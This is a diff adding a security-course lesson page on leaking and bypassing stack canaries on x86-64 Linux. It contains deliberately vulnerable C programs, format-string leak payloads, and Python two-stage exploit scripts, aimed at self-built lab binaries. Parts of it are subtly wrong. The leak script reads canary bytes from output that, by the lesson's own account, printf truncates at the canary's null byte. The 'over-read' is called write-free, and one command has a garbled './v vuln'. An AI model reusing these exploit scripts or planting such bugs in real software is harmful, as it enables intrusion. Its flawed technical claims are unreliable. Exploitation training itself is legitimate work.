@@ -1,0 +1,367 @@
+<h1 id="offset-calculation-and-canary-leak">Offset Calculation and Canary Leak</h1>
+<h2 id="summary">Summary</h2>
+<p>With NX on, you cannot run shellcode from the stack. With a canary, you cannot overwrite the<br />
+return address without knowing the canary. Modern exploitation is therefore: <strong>leak, then<br />
+control</strong>.</p>
+<h2 id="key-ideas">Key ideas</h2>
+<ul>
+<li><strong>Stage 1: leak.</strong> Over-read past the buffer until the canary appears. No canary modification<br />
+  required, so no abort</li>
+<li><strong>Stage 2: compute.</strong> The canary's low byte is always <code>0x00</code>, so it starts with a null byte<br />
+  — you cannot send it over a shell argument, which is why string functions stop there</li>
+<li><strong>Format string bugs</strong> leak the canary directly (<code>%p</code>/<code>%x</code>) without needing an off-by-one</li>
+<li>With the canary known, the offset becomes: <code>buffer + padding + canary + saved rbp + new rip</code></li>
+<li>A leak is also required for ASLR (PIE base or a libc address)</li>
+</ul>
+<h2 id="the-canary-in-detail">The canary, in detail</h2>
+<pre><code class="language-text"> 0x7fffffffe2a8  local buffer          &lt;- overflow starts here
+ 0x7fffffffe2c8  saved RBP             &lt;- 8 bytes
+ 0x7fffffffe2d0  RETURN ADDRESS        &lt;- 8 bytes
+</code></pre>
+<pre><code class="language-c">char buf[64];
+</code></pre>
+<ul>
+<li>overflow <code>0..63</code> fills the buffer</li>
+<li>bytes <code>64..71</code> overwrite the saved RBP</li>
+<li>bytes <code>72..79</code> overwrite the return address</li>
+</ul>
+<p>But with a canary the layout is:</p>
+<pre><code class="language-text"> buf[64] | canary 8 bytes (low byte 0x00) | saved RBP | return address
+</code></pre>
+<p>The canary is checked at <code>__stack_chk_fail</code> on function exit. Overflowing corrupts it → abort.</p>
+<p><strong>The workaround:</strong> stop at the canary, read the 8 bytes (you now know them), then send the<br />
+correct canary back plus your payload. The check passes.</p>
+<h2 id="terminology">Terminology</h2>
+<table>
+<thead>
+<tr>
+<th>Term</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Canary</strong></td>
+<td>Random guard between locals and the return address</td>
+</tr>
+<tr>
+<td><strong><code>__stack_chk_fail</code></strong></td>
+<td>glibc handler called when the canary mismatches</td>
+</tr>
+<tr>
+<td><strong>Over-read</strong></td>
+<td>Reading past the buffer <em>without writing</em> — no abort</td>
+</tr>
+<tr>
+<td><strong>Null-terminated stop</strong></td>
+<td><code>read</code>/<code>gets</code> stop at the canary's leading null</td>
+</tr>
+<tr>
+<td><strong>Format string leak</strong></td>
+<td><code>%p</code>/<code>%x</code>/<code>%s</code> reading the canary directly</td>
+</tr>
+<tr>
+<td><strong>Two-stage exploit</strong></td>
+<td>Leak first, then exploit</td>
+</tr>
+<tr>
+<td><strong>Libc base</strong></td>
+<td>Where libc is loaded; needed for ret2libc</td>
+</tr>
+<tr>
+<td><strong>Info leak</strong></td>
+<td>Obtaining an address the binary hid from you</td>
+</tr>
+</tbody>
+</table>
+<h2 id="kali-commands">Kali commands</h2>
+<pre><code class="language-bash"># --- canary presence and location ---
+checksec --file=./target | grep -i canary
+objdump -d ./target | grep -E &quot;stack_chk_fail|fs:0x28&quot; | head -5
+readelf -s ./target | grep stack_chk_fail
+
+# --- the canary lives at fs:0x28 (x86-64 thread control block) ---
+#   __stack_chk_fail reads %fs:0x28 and compares it to the saved copy
+
+# --- find the offset of the canary on the stack by over-reading ---
+python3 - &lt;&lt;'PY'
+import subprocess, struct
+# binary built with a canary; see where the null-byte run appears in output
+for n in range(60, 100):
+    r = subprocess.run([&quot;./target-canary&quot;, b&quot;A&quot;*n], capture_output=True, timeout=5)
+    out = r.stdout
+    if b&quot;\x00&quot; in out or r.returncode != 0:
+        print(f&quot;  n={n}: canary reached (returncode={r.returncode}, output has null: {b'\\x00' in out})&quot;)
+        break
+PY
+
+# --- format string: leak anything ---
+#   ALWAYS on a program you compiled yourself for the exercise
+cat &gt; fmt.c &lt;&lt;'EOF'
+#include &lt;stdio.h&gt;
+int main(int argc, char **argv) { printf(argv[1]); return 0; }
+EOF
+gcc -g -O0 -fno-stack-protector -no-pie fmt.c -o fmt
+./fmt &quot;%p %p %p %p %p %p&quot;        # walk the stack
+./fmt &quot;%1$p %2$p %3$p&quot;           # positional
+./fmt &quot;%x %x %x&quot;                 # hex
+./fmt &quot;AAAA%7$p-%8$p-&quot;           # see the layout around your input
+./fmt &quot;%s&quot;                       # DANGER: dereference - may crash
+
+# --- the classic target with a format string bug + canary ---
+cat &gt; vuln.c &lt;&lt;'EOF'
+#include &lt;stdio.h&gt;
+int main(int argc, char **argv) {
+    char buf[64];
+    if (argc &lt; 2) return 1;
+    sprintf(buf, argv[1]);        /* format string vulnerability */
+    return 0;
+}
+EOF
+gcc -g -O0 -fno-stack-protector -no-pie vuln.c -o vuln
+for i in $(seq 1 20); do ./v vuln &quot;$(python3 -c &quot;print('A'*$i + '%p')&quot;)&quot; 2&gt;/dev/null; done | head
+
+# --- two-stage in one script (the real technique) ---
+cat &gt; exploit.py &lt;&lt;'PY'
+import struct, subprocess, sys
+CANARY_OFFSET = 72   # determine with the over-read first
+
+def leak():
+    # send exactly up to, but not over, the canary
+    payload = b&quot;A&quot; * CANARY_OFFSET
+    r = subprocess.run([&quot;./target&quot;, payload], capture_output=True, timeout=5)
+    out = r.stdout
+    idx = out.find(b&quot;A&quot; * CANARY_OFFSET)
+    canary = out[idx + CANARY_OFFSET : idx + CANARY_OFFSET + 8]
+    return canary
+
+def exploit(canary, ret_addr):
+    payload = b&quot;B&quot; * 64 + canary + struct.pack(&quot;&lt;Q&quot;, 0) + struct.pack(&quot;&lt;Q&quot;, ret_addr)
+    subprocess.run([&quot;./target&quot;, payload], capture_output=True, timeout=5)
+
+c = leak()
+print(f&quot;  leaked canary: {c.hex()}&quot;)
+print(f&quot;  low byte is {c[0]:#04x} - {'as expected (null)' if c[0]==0 else 'UNEXPECTED'}&quot;)
+PY
+echo &quot;python3 exploit.py&quot;
+</code></pre>
+<h2 id="field-lab">Field lab</h2>
+<p><strong>Objective:</strong> leak a canary with an over-read, prove it is correct, then use it.</p>
+<pre><code class="language-bash">mkdir -p ~/aegis/labs/ex-04 &amp;&amp; cd ~/aegis/labs/ex-04
+
+# --- build a target WITH a canary, the realistic case ---
+cat &gt; target.c &lt;&lt;'EOF'
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+
+void win(void) { write(1, &quot;you win\n&quot;, 8); }
+
+void read_input(char *buf) {
+    /* deliberately stops at the canary's leading null byte */
+    ssize_t n = read(0, buf, 96);
+    buf[n &gt; 0 ? n : 0] = '\0';
+}
+
+void vuln(void) {
+    char buf[64];
+    read_input(buf);
+    /* buf is printed; printf(&quot;%s&quot;) stops at the canary's first null byte */
+    printf(&quot;%s\n&quot;, buf);
+}
+
+int main(void) { vuln(); return 0; }
+EOF
+gcc -Wall -g -O0 -fstack-protector-strong -no-pie target.c -o target
+checksec --file=./target | grep -E &quot;canary|NX|PIE|RELRO&quot;
+
+# --- 1. find the canary's offset by over-reading ---
+echo
+echo &quot;=== locating the canary (over-read) ===&quot;
+python3 - &lt;&lt;'PY' | tee 01-canary-offset.txt
+import subprocess
+# The canary's low byte is 0x00, so the printed output stops there.
+# Walk the offset forward until the printed length stops growing.
+last = -1
+for n in range(60, 100, 1):
+    payload = b&quot;A&quot; * n
+    r = subprocess.run([&quot;./target&quot;], input=payload, capture_output=True, timeout=5)
+    printed = len(r.stdout.rstrip(b&quot;\n&quot;))
+    if printed != n and n &gt;= 64:
+        print(f&quot;  offset {n}: only {printed} bytes came back -&gt; canary starts at {printed}&quot;)
+        print(f&quot;  canary spans offsets {printed}..{printed+7}&quot;)
+        break
+    last = printed
+else:
+    print(&quot;  canary offset not found in range&quot;)
+PY
+cat 01-canary-offset.txt
+
+# --- 2. read the canary out of the output ---
+echo
+echo &quot;=== leaking the canary ===&quot;
+CANARY_OFFSET=$(grep -oE &quot;starts at [0-9]+&quot; 01-canary-offset.txt | grep -oE &quot;[0-9]+$&quot;)
+CANARY_OFFSET=${CANARY_OFFSET:-72}
+echo &quot;  using canary offset: $CANARY_OFFSET&quot;
+python3 - &lt;&lt;PY | tee 02-leak.txt
+import subprocess, struct
+OFF = $CANARY_OFFSET
+payload = b&quot;A&quot; * OFF
+r = subprocess.run([&quot;./target&quot;], input=payload, capture_output=True, timeout=5)
+out = r.stdout
+canary = out[OFF:OFF+8]
+print(f&quot;  raw 8 bytes at offset {OFF}: {canary.hex()}&quot;)
+print(f&quot;  low byte            : {canary[0]:#04x}   (always 0x00 on Linux x86-64)&quot;)
+print(f&quot;  as a qword          : {struct.unpack('&lt;Q', canary)[0]:#018x}&quot;)
+print()
+print(&quot;  This is the real canary. The next stage sends it back unchanged,&quot;)
+print(&quot;  so __stack_chk_fail finds it intact and the function returns.&quot;)
+PY
+
+# --- 3. verify the canary is correct by echoing it back ---
+echo
+echo &quot;=== verifying: send the canary back and reach past it ===&quot;
+python3 - &lt;&lt;PY | tee 03-verify.txt
+import subprocess, struct
+OFF = $CANARY_OFFSET
+def run(p):
+    return subprocess.run([&quot;./target&quot;], input=p, capture_output=True, timeout=5)
+
+r = run(b&quot;A&quot; * OFF)
+canary = r.stdout[OFF:OFF+8]
+
+# correct: pad + canary + saved RBP + a marker we can find in the output
+marker = struct.pack(&quot;&lt;Q&quot;, 0x4242424242424242)
+p = b&quot;A&quot; * OFF + canary + struct.pack(&quot;&lt;Q&quot;, 0) + marker
+r = run(p)
+print(f&quot;  exit code with correct canary : {r.returncode}&quot;)
+print(f&quot;  exit code with wrong canary   : &quot;, end=&quot;&quot;)
+r2 = run(b&quot;A&quot; * OFF + b&quot;\x41&quot;*8 + struct.pack(&quot;&lt;Q&quot;, 0) + marker)
+print(r2.returncode)
+print(f&quot;  output contains our marker    : {b'BBBBBBBB' in r.stdout}&quot;)
+print()
+print(&quot;  0  -&gt; canary accepted, execution continued past it&quot;)
+print(&quot;  134 -&gt; __stack_chk_fail called abort(); the canary was wrong&quot;)
+print(&quot;  The marker being echoed proves we wrote ABOVE the canary.&quot;)
+PY
+
+# --- 4. the format-string alternative (shorter, no offset math) ---
+echo
+echo &quot;=== format string: leak the canary directly ===&quot;
+cat &gt; fmt.c &lt;&lt;'EOF'
+#include &lt;stdio.h&gt;
+void secret(void);
+void win(void);
+int main(int argc, char **argv) {
+    if (argc &lt; 2) return 1;
+    printf(argv[1]);      /* the bug: user data used as the format string */
+    return 0;
+}
+void secret(void) { }
+void win(void)   { puts(&quot;WIN&quot;); }
+EOF
+gcc -g -O0 -fno-stack-protector -no-pie fmt.c -o fmt
+
+echo &quot;  walking the stack to find a canary-shaped value:&quot;
+./fmt '%p.%p.%p.%p.%p.%p.%p.%p' 2&gt;/dev/null
+echo
+echo &quot;  A value ending in 00 and looking random is a canary.&quot;
+echo &quot;  Now put it where printf will read it as an argument:&quot;
+./fmt 'AAAA%.20p' 2&gt;/dev/null | head -1
+echo
+echo &quot;  Positional and length specifiers let you read bytes:&quot;
+./fmt '%8\$p' 2&gt;/dev/null
+echo
+echo &quot;  NEVER run %n against anything but your own binaries - it WRITES memory.&quot;
+
+# --- 5. the complete two-stage flow ---
+cat &gt; exploit.py &lt;&lt;'PY'
+#!/usr/bin/env python3
+&quot;&quot;&quot;
+Two-stage canary leak against YOUR OWN lab binary.
+Stage 1: over-read the canary. Stage 2: send it back and continue.
+&quot;&quot;&quot;
+import struct, subprocess, sys
+
+TARGET = &quot;./target&quot;
+def canary_offset(target, lo=60, hi=120):
+    for n in range(lo, hi):
+        r = subprocess.run([target], input=b&quot;A&quot;*n, capture_output=True, timeout=5)
+        printed = len(r.stdout.rstrip(b&quot;\n&quot;))
+        if printed != n and n &gt;= 64:
+            return printed
+    return None
+
+def leak(target, off):
+    r = subprocess.run([target], input=b&quot;A&quot;*off, capture_output=True, timeout=5)
+    return r.stdout[off:off+8]
+
+def main():
+    off = canary_offset(TARGET)
+    if off is None:
+        print(&quot;  could not determine the canary offset&quot;); return 1
+    canary = leak(TARGET, off)
+    if len(canary) != 8:
+        print(&quot;  short read&quot;); return 1
+    print(f&quot;  canary offset : {off}&quot;)
+    print(f&quot;  canary        : {canary.hex()}&quot;)
+    print(f&quot;  low byte      : {canary[0]:#04x} ({'expected' if canary[0]==0 else 'UNEXPECTED'})&quot;)
+
+    marker = struct.pack(&quot;&lt;Q&quot;, 0x4242424242424242)
+    payload = b&quot;A&quot;*off + canary + struct.pack(&quot;&lt;Q&quot;, 0) + marker
+    r = subprocess.run([TARGET], input=payload, capture_output=True, timeout=5)
+    print(f&quot;  stage 2 exit  : {r.returncode}&quot;)
+    print(f&quot;  marker echoed : {b'BBBBBBBB' in r.stdout}&quot;)
+    print()
+    print(&quot;  The canary has been defeated. ASLR/PIE is the next obstacle.&quot;)
+    return 0
+
+if __name__ == &quot;__main__&quot;:
+    sys.exit(main())
+PY
+chmod +x exploit.py
+python3 exploit.py | tee 04-two-stage.txt
+
+# --- 6. record the whole picture ---
+cat &gt; 05-canary-notes.md &lt;&lt;'EOF'
+# Canary notes
+
+## Layout on x86-64 Linux
+    buf[N] | canary (8 bytes, low byte 0x00) | saved RBP (8) | return address (8)
+
+## Why the low byte is 0x00
+`fs:0x28` holds the guard value. Its least significant byte is zeroed so that a
+string function writing the canary will terminate at it, making a naive
+overwrite via a C string very unlikely to succeed silently.
+
+## The two ways to defeat it
+1. **Over-read then echo** - no write happens, so no abort. Requires the read
+   to be bounded and the output to reveal the bytes.
+2. **Format string** - `%p` reads the value directly. Faster, and the standard
+   approach when a format string bug exists.
+
+## What you still need afterwards
+- a return-address target: with NX you need libc/stack/heap addresses
+- with PIE you need a code or libc base leak (an info leak)
+- with Full RELRO the GOT is read-only, so you must target something else
+
+## Detection
+SIGABRT (exit 134) means a canary was caught. That is a *successful* defence,
+and it leaves evidence in logs.
+EOF
+cat 05-canary-notes.md
+</code></pre>
+<p><strong>Step 3 is the proof.</strong> Correct canary → exit 0 and your marker echoed; wrong canary → exit 134.<br />
+That single contrast is the whole lecture.</p>
+<p><strong>Record:</strong> <code>04-two-stage.txt</code> and <code>05-canary-notes.md</code>.</p>
+<h2 id="self-test">Self-test</h2>
+<ol>
+<li>Why is the canary's low byte always <code>0x00</code> on Linux x86-64?</li>
+<li>Why does an over-read not trigger the canary check?</li>
+<li>What does exit code 134 tell you about what happened?</li>
+<li>When would a format string bug be easier than an over-read?</li>
+<li>After defeating the canary, what two obstacles remain?</li>
+</ol>
+<h2 id="connected-knowledge">Connected knowledge</h2>
+<p><strong>Stack Canary</strong> → <strong><code>__stack_chk_fail</code></strong> → <strong>Info Leak</strong> → <strong>ASLR</strong> → <strong>Format String</strong> →<br />
+<strong>ROP</strong>.</p>
